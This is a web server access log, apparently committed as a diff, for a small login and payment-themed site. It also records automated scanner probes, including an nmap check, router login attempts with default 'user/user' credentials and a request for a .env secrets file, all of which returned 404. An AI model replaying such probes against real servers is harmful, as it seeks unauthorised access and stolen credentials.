+[pid: 17326|app: 0|req: 27/143] 128.14.134.134 () {34 vars in 490 bytes} [Tue Oct 11 00:47:25 2022] GET / => generated 5013 bytes in 8 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 54/144] 50.31.21.6 () {26 vars in 279 bytes} [Tue Oct 11 01:04:08 2022] GET / => generated 5013 bytes in 7 msecs (HTTP/1.0 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 55/145] 50.31.21.6 () {26 vars in 279 bytes} [Tue Oct 11 01:05:59 2022] GET / => generated 5013 bytes in 16 msecs (HTTP/1.0 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 38/146] 50.31.21.6 () {32 vars in 535 bytes} [Tue Oct 11 01:05:59 2022] GET /nmaplowercheck1665449357 => generated 232 bytes in 19 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 12/147] 50.31.21.6 () {32 vars in 488 bytes} [Tue Oct 11 01:05:59 2022] HEAD / => generated 0 bytes in 33 msecs (HTTP/1.1 200) 5 headers in 278 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 56/148] 50.31.21.6 () {32 vars in 507 bytes} [Tue Oct 11 01:05:59 2022] GET /evox/about => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 13/149] 50.31.21.6 () {28 vars in 306 bytes} [Tue Oct 11 01:05:59 2022] GET / => generated 5013 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 57/150] 50.31.21.6 () {32 vars in 497 bytes} [Tue Oct 11 01:05:59 2022] GET /HNAP1 => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 28/151] 50.31.21.6 () {34 vars in 523 bytes} [Tue Oct 11 01:06:01 2022] POST /sdk => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 58/152] 159.138.122.77 () {34 vars in 486 bytes} [Tue Oct 11 01:31:45 2022] GET / => generated 5013 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 14/153] 159.223.159.202 () {34 vars in 397 bytes} [Tue Oct 11 03:35:07 2022] GET / => generated 5013 bytes in 29 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 59/154] 167.94.138.2 () {28 vars in 311 bytes} [Tue Oct 11 03:54:26 2022] GET / => generated 5013 bytes in 22 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17328|app: 0|req: 60/155] 167.94.138.2 () {34 vars in 443 bytes} [Tue Oct 11 03:54:26 2022] GET / => generated 5013 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 39/156] 167.94.138.2 () {34 vars in 471 bytes} [Tue Oct 11 03:54:27 2022] GET /favicon.ico => generated 232 bytes in 12 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 61/157] 222.139.96.172 () {26 vars in 374 bytes} [Tue Oct 11 04:00:44 2022] GET /boaform/admin/formLogin?username=user&psd=user => generated 232 bytes in 4 msecs (HTTP/1.0 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 62/158] 138.68.132.217 () {34 vars in 396 bytes} [Tue Oct 11 04:43:33 2022] GET / => generated 5013 bytes in 8 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 29/159] 103.129.195.2 () {32 vars in 466 bytes} [Tue Oct 11 05:23:20 2022] GET / => generated 5013 bytes in 28 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 15/160] 80.94.92.231 () {28 vars in 311 bytes} [Tue Oct 11 05:25:22 2022] GET / => generated 5013 bytes in 28 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 40/161] 192.241.209.134 () {34 vars in 397 bytes} [Tue Oct 11 06:50:46 2022] GET / => generated 5013 bytes in 16 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 16/162] 46.252.40.195 () {32 vars in 464 bytes} [Tue Oct 11 07:47:39 2022] GET / => generated 5013 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 30/163] 183.136.225.35 () {34 vars in 461 bytes} [Tue Oct 11 08:45:08 2022] GET / => generated 5013 bytes in 30 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 31/164] 183.136.225.35 () {36 vars in 522 bytes} [Tue Oct 11 08:45:10 2022] GET / => generated 5013 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 32/165] 183.136.225.35 () {36 vars in 544 bytes} [Tue Oct 11 08:45:22 2022] GET /favicon.ico => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 33/166] 183.136.225.35 () {36 vars in 542 bytes} [Tue Oct 11 08:45:24 2022] GET /robots.txt => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 17/167] 103.79.35.168 () {32 vars in 466 bytes} [Tue Oct 11 09:17:15 2022] GET / => generated 5013 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 63/168] 217.17.108.162 () {32 vars in 467 bytes} [Tue Oct 11 09:26:42 2022] GET / => generated 5013 bytes in 16 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 64/169] 139.59.134.97 () {34 vars in 395 bytes} [Tue Oct 11 09:46:21 2022] GET / => generated 5013 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 65/170] 23.251.102.90 () {34 vars in 499 bytes} [Tue Oct 11 09:55:47 2022] GET /solr/ => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 41/171] 138.0.228.106 () {32 vars in 472 bytes} [Tue Oct 11 10:03:41 2022] GET / => generated 5013 bytes in 23 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 42/172] 45.222.128.252 () {44 vars in 929 bytes} [Tue Oct 11 10:09:13 2022] GET /userlogin => generated 3140 bytes in 13 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 66/173] 45.222.128.252 () {44 vars in 869 bytes} [Tue Oct 11 10:09:13 2022] GET /static/css/newstyle.css => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 175 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 67/174] 45.222.128.252 () {44 vars in 909 bytes} [Tue Oct 11 10:09:14 2022] GET /static/img/user.jpeg => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 172 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 68/175] 45.222.128.252 () {42 vars in 836 bytes} [Tue Oct 11 10:09:15 2022] GET /favicon.ico => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 69/176] 94.102.61.10 () {34 vars in 488 bytes} [Tue Oct 11 10:12:16 2022] GET / => generated 5013 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 34/177] 68.183.143.66 () {34 vars in 395 bytes} [Tue Oct 11 10:52:16 2022] GET / => generated 5013 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 35/178] 75.55.87.231 () {36 vars in 524 bytes} [Tue Oct 11 11:30:08 2022] GET /.env => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 18/179] 75.55.87.231 () {40 vars in 631 bytes} [Tue Oct 11 11:30:09 2022] POST / => generated 178 bytes in 8 msecs (HTTP/1.1 405) 4 headers in 155 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 19/180] 193.142.146.35 () {28 vars in 313 bytes} [Tue Oct 11 11:33:36 2022] GET / => generated 5013 bytes in 11 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 43/181] 193.142.146.35 () {40 vars in 657 bytes} [Tue Oct 11 11:33:36 2022] POST /HNAP1/ => generated 232 bytes in 12 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 44/182] 80.94.92.231 () {28 vars in 311 bytes} [Tue Oct 11 12:05:50 2022] GET / => generated 5013 bytes in 10 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 36/183] 104.248.81.21 () {34 vars in 395 bytes} [Tue Oct 11 12:13:28 2022] GET / => generated 5013 bytes in 13 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17324|app: 0|req: 20/184] 223.71.167.166 () {34 vars in 461 bytes} [Tue Oct 11 12:25:10 2022] GET / => generated 5013 bytes in 25 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17325|app: 0|req: 16/185] 34.75.111.246 () {28 vars in 312 bytes} [Tue Oct 11 13:08:19 2022] GET / => generated 5013 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17325|app: 0|req: 17/186] 34.75.111.246 () {40 vars in 656 bytes} [Tue Oct 11 13:08:20 2022] POST /HNAP1/ => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 37/187] 45.222.128.252 () {40 vars in 656 bytes} [Tue Oct 11 13:30:38 2022] GET / => generated 5013 bytes in 11 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 38/188] 45.222.128.252 () {42 vars in 766 bytes} [Tue Oct 11 13:30:38 2022] GET /style.css => generated 232 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 45/189] 45.222.128.252 () {44 vars in 841 bytes} [Tue Oct 11 13:30:38 2022] GET /static/css/land.css => generated 0 bytes in 13 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 46/190] 45.222.128.252 () {44 vars in 882 bytes} [Tue Oct 11 13:30:38 2022] GET /static/img/mkk.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 170 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 47/191] 45.222.128.252 () {44 vars in 884 bytes} [Tue Oct 11 13:30:38 2022] GET /static/img/visa.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 171 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 48/192] 45.222.128.252 () {44 vars in 884 bytes} [Tue Oct 11 13:30:38 2022] GET /static/img/gpay.png => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 39/193] 45.222.128.252 () {44 vars in 888 bytes} [Tue Oct 11 13:30:38 2022] GET /static/img/qrcode.png => generated 0 bytes in 10 msecs (HTTP/1.1 304) 4 headers in 173 bytes (0 switches on core 0)
+[pid: 17325|app: 0|req: 18/194] 45.222.128.252 () {44 vars in 908 bytes} [Tue Oct 11 13:30:38 2022] GET /static/img/Central-Uni-logo.png => generated 0 bytes in 18 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 21/195] 45.222.128.252 () {44 vars in 908 bytes} [Tue Oct 11 13:30:38 2022] GET /static/img/2000px-Apple_Pay.png => generated 0 bytes in 18 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 70/196] 45.222.128.252 () {44 vars in 896 bytes} [Tue Oct 11 13:30:38 2022] GET /static/img/mastercard.png => generated 0 bytes in 21 msecs (HTTP/1.1 304) 4 headers in 177 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 71/197] 45.222.128.252 () {44 vars in 846 bytes} [Tue Oct 11 13:32:15 2022] GET /userlogin => generated 3140 bytes in 12 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 72/198] 45.222.128.252 () {42 vars in 823 bytes} [Tue Oct 11 13:32:15 2022] GET /static/css/newstyle.css => generated 3386 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 7 headers in 272 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 22/199] 45.222.128.252 () {42 vars in 860 bytes} [Tue Oct 11 13:32:15 2022] GET /static/img/user.jpeg => generated 56377 bytes in 13 msecs via sendfile() (HTTP/1.1 200) 7 headers in 257 bytes (0 switches on core 0)
+None
+None
+None
+[pid: 17324|app: 0|req: 23/200] 45.222.128.252 () {44 vars in 877 bytes} [Tue Oct 11 13:32:44 2022] GET /usersignup => generated 3404 bytes in 33 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 73/201] 45.222.128.252 () {44 vars in 879 bytes} [Tue Oct 11 13:32:44 2022] GET /static/css/newstyle.css => generated 0 bytes in 8 msecs (HTTP/1.1 304) 4 headers in 175 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 40/202] 45.222.128.252 () {44 vars in 916 bytes} [Tue Oct 11 13:32:44 2022] GET /static/img/user.jpeg => generated 0 bytes in 10 msecs (HTTP/1.1 304) 4 headers in 172 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 49/203] 45.222.128.252 () {40 vars in 719 bytes} [Tue Oct 11 13:37:40 2022] GET / => generated 5013 bytes in 18 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 74/204] 45.222.128.252 () {42 vars in 777 bytes} [Tue Oct 11 13:37:40 2022] GET /static/css/land.css => generated 2110 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 41/205] 45.222.128.252 () {42 vars in 757 bytes} [Tue Oct 11 13:37:40 2022] GET /style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 42/206] 45.222.128.252 () {42 vars in 847 bytes} [Tue Oct 11 13:37:40 2022] GET /static/img/Central-Uni-logo.png => generated 444470 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 75/207] 45.222.128.252 () {42 vars in 821 bytes} [Tue Oct 11 13:37:40 2022] GET /static/img/mkk.png => generated 114135 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 50/208] 45.222.128.252 () {42 vars in 823 bytes} [Tue Oct 11 13:37:40 2022] GET /static/img/visa.png => generated 72545 bytes in 7 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 43/209] 45.222.128.252 () {42 vars in 823 bytes} [Tue Oct 11 13:37:40 2022] GET /static/img/gpay.png => generated 478257 bytes in 8 msecs via sendfile() (HTTP/1.1 200) 7 headers in 256 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 24/210] 45.222.128.252 () {42 vars in 827 bytes} [Tue Oct 11 13:37:40 2022] GET /static/img/qrcode.png => generated 320662 bytes in 8 msecs via sendfile() (HTTP/1.1 200) 7 headers in 258 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 76/211] 45.222.128.252 () {42 vars in 835 bytes} [Tue Oct 11 13:37:40 2022] GET /static/img/mastercard.png => generated 105021 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 262 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 77/212] 45.222.128.252 () {42 vars in 847 bytes} [Tue Oct 11 13:37:40 2022] GET /static/img/2000px-Apple_Pay.png => generated 33719 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 267 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 78/213] 45.222.128.252 () {44 vars in 796 bytes} [Tue Oct 11 13:37:41 2022] GET /Roboto-Regular.ttf => generated 232 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 153 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 25/214] 45.222.128.252 () {42 vars in 807 bytes} [Tue Oct 11 13:37:43 2022] GET /favicon.ico => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 79/215] 45.222.128.252 () {44 vars in 909 bytes} [Tue Oct 11 13:37:51 2022] GET /userlogin => generated 3140 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 51/216] 45.222.128.252 () {42 vars in 814 bytes} [Tue Oct 11 13:37:51 2022] GET /static/css/newstyle.css => generated 3386 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 272 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 80/217] 45.222.128.252 () {42 vars in 854 bytes} [Tue Oct 11 13:37:51 2022] GET /static/img/user.jpeg => generated 56377 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 7 headers in 257 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 52/218] 45.222.128.252 () {42 vars in 810 bytes} [Tue Oct 11 13:38:16 2022] GET / => generated 5013 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 53/219] 45.222.128.252 () {42 vars in 786 bytes} [Tue Oct 11 13:38:16 2022] GET /style.css => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 26/220] 45.222.128.252 () {44 vars in 928 bytes} [Tue Oct 11 13:38:16 2022] GET /static/img/2000px-Apple_Pay.png => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 54/221] 45.222.128.252 () {44 vars in 902 bytes} [Tue Oct 11 13:38:16 2022] GET /static/img/mkk.png => generated 0 bytes in 8 msecs (HTTP/1.1 304) 4 headers in 170 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 44/222] 45.222.128.252 () {44 vars in 861 bytes} [Tue Oct 11 13:38:16 2022] GET /static/css/land.css => generated 0 bytes in 8 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 27/223] 45.222.128.252 () {44 vars in 916 bytes} [Tue Oct 11 13:38:16 2022] GET /static/img/mastercard.png => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 177 bytes (0 switches on core 0)
+[pid: 17325|app: 0|req: 19/224] 45.222.128.252 () {44 vars in 904 bytes} [Tue Oct 11 13:38:16 2022] GET /static/img/visa.png => generated 0 bytes in 8 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 28/225] 45.222.128.252 () {44 vars in 908 bytes} [Tue Oct 11 13:38:16 2022] GET /static/img/qrcode.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 173 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 81/226] 45.222.128.252 () {44 vars in 928 bytes} [Tue Oct 11 13:38:16 2022] GET /static/img/Central-Uni-logo.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 82/227] 45.222.128.252 () {44 vars in 904 bytes} [Tue Oct 11 13:38:16 2022] GET /static/img/gpay.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+try
+None
+None
+[pid: 17326|app: 0|req: 45/228] 45.222.128.252 () {44 vars in 858 bytes} [Tue Oct 11 13:38:24 2022] GET /login => generated 1687 bytes in 32 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 83/229] 45.222.128.252 () {42 vars in 791 bytes} [Tue Oct 11 13:38:24 2022] GET /style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 55/230] 45.222.128.252 () {42 vars in 815 bytes} [Tue Oct 11 13:38:24 2022] GET /static/css/stylee.css => generated 2763 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 270 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 56/231] 45.222.128.252 () {44 vars in 866 bytes} [Tue Oct 11 13:38:26 2022] GET /userlogin => generated 3140 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 57/232] 45.222.128.252 () {44 vars in 878 bytes} [Tue Oct 11 13:38:26 2022] GET /static/css/newstyle.css => generated 0 bytes in 5 msecs (HTTP/1.1 304) 4 headers in 175 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 84/233] 45.222.128.252 () {44 vars in 915 bytes} [Tue Oct 11 13:38:26 2022] GET /static/img/user.jpeg => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 172 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 46/234] 45.222.128.252 () {42 vars in 846 bytes} [Tue Oct 11 13:39:35 2022] GET /static/img/mkk.png => generated 114135 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 85/235] 45.222.128.252 () {40 vars in 688 bytes} [Tue Oct 11 13:39:59 2022] GET / => generated 5013 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 86/236] 45.222.128.252 () {42 vars in 798 bytes} [Tue Oct 11 13:39:59 2022] GET /style.css => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 87/237] 45.222.128.252 () {44 vars in 873 bytes} [Tue Oct 11 13:39:59 2022] GET /static/css/land.css => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 88/238] 45.222.128.252 () {44 vars in 962 bytes} [Tue Oct 11 13:39:59 2022] GET /static/img/2000px-Apple_Pay.png => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17325|app: 0|req: 20/240] 45.222.128.252 () {44 vars in 936 bytes} [Tue Oct 11 13:39:59 2022] GET /static/img/mkk.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 170 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 47/240] 45.222.128.252 () {44 vars in 950 bytes} [Tue Oct 11 13:39:59 2022] GET /static/img/mastercard.png => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 177 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 29/241] 45.222.128.252 () {44 vars in 938 bytes} [Tue Oct 11 13:39:59 2022] GET /static/img/visa.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 89/242] 45.222.128.252 () {44 vars in 942 bytes} [Tue Oct 11 13:39:59 2022] GET /static/img/qrcode.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 173 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 48/243] 45.222.128.252 () {44 vars in 962 bytes} [Tue Oct 11 13:39:59 2022] GET /static/img/Central-Uni-logo.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 58/244] 45.222.128.252 () {44 vars in 938 bytes} [Tue Oct 11 13:39:59 2022] GET /static/img/gpay.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 90/245] 45.222.128.252 () {36 vars in 597 bytes} [Tue Oct 11 13:39:59 2022] GET /favicon.ico => generated 232 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 59/246] 184.105.247.252 () {28 vars in 311 bytes} [Tue Oct 11 14:11:58 2022] GET / => generated 5013 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 60/247] 184.105.247.247 () {34 vars in 477 bytes} [Tue Oct 11 14:15:29 2022] GET /favicon.ico => generated 232 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 61/248] 45.222.128.252 () {42 vars in 701 bytes} [Tue Oct 11 14:55:21 2022] GET / => generated 5013 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 30/249] 45.222.128.252 () {44 vars in 798 bytes} [Tue Oct 11 14:55:21 2022] GET /static/css/land.css => generated 2110 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 91/250] 45.222.128.252 () {44 vars in 778 bytes} [Tue Oct 11 14:55:21 2022] GET /style.css => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 92/251] 45.222.128.252 () {44 vars in 868 bytes} [Tue Oct 11 14:55:22 2022] GET /static/img/Central-Uni-logo.png => generated 444470 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 7 headers in 268 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 49/252] 45.222.128.252 () {44 vars in 842 bytes} [Tue Oct 11 14:55:22 2022] GET /static/img/mkk.png => generated 114135 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 31/253] 45.222.128.252 () {44 vars in 844 bytes} [Tue Oct 11 14:55:22 2022] GET /static/img/visa.png => generated 72545 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 7 headers in 255 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 93/254] 45.222.128.252 () {44 vars in 848 bytes} [Tue Oct 11 14:55:22 2022] GET /static/img/qrcode.png => generated 320662 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 258 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 94/255] 45.222.128.252 () {44 vars in 856 bytes} [Tue Oct 11 14:55:22 2022] GET /static/img/mastercard.png => generated 105021 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 262 bytes (0 switches on core 0)
+[pid: 17325|app: 0|req: 21/256] 45.222.128.252 () {44 vars in 844 bytes} [Tue Oct 11 14:55:22 2022] GET /static/img/gpay.png => generated 478257 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 7 headers in 256 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 50/257] 45.222.128.252 () {44 vars in 868 bytes} [Tue Oct 11 14:55:22 2022] GET /static/img/2000px-Apple_Pay.png => generated 33719 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 7 headers in 267 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 62/258] 45.222.128.252 () {44 vars in 828 bytes} [Tue Oct 11 14:55:23 2022] GET /favicon.ico => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 95/259] 45.222.128.252 () {46 vars in 891 bytes} [Tue Oct 11 14:55:30 2022] GET /userlogin => generated 3140 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 96/260] 45.222.128.252 () {44 vars in 835 bytes} [Tue Oct 11 14:55:30 2022] GET /static/css/newstyle.css => generated 3386 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 272 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 97/261] 45.222.128.252 () {44 vars in 875 bytes} [Tue Oct 11 14:55:32 2022] GET /static/img/user.jpeg => generated 56377 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 7 headers in 257 bytes (0 switches on core 0)
+None
+None
+None
